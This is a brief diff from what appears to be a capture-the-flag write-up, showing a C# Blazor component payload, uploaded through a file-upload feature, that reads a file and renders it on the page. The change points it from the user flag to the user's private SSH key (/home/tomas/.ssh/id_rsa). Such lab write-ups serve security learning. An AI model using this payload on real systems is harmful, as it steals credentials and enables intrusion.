@@ -148,7 +148,7 @@ In the "Upload content" section, we can upload any file type and it is saved in 
                 base.BuildRenderTree(builder);
 
                 // Read file content
-                string file = File.ReadAllText("/home/tomas/user.txt"); // user flag
+                string file = File.ReadAllText("/home/tomas/.ssh/id_rsa"); //ssh key
                 builder.AddContent(0, file);
             }
         }
